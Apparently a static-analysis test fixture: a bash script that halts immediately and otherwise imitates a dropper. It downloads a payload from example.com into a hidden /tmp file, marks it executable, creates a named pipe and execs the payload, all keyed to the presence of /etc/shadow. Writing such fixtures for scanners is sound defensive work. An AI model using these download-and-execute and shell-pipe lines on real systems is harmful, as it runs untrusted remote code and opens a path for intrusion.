##!/usr/bin/env bash
echo "FATAL: This file is a static analysis fixture and must never be executed!" >&2
return 1 2>/dev/null || exit 1
tmp="/tmp/.cache"
count=3

log_and_run() {
  local url="http://example.com/payload"
  trap 'rm -f "$tmp"' EXIT
  eval "echo start"
  curl "$url" -o "$tmp"
  chmod 700 "$tmp"
}

launch() {
  mkfifo /tmp/f
  exec bash "$tmp"
}

if test -f /etc/shadow; then
  log_and_run
fi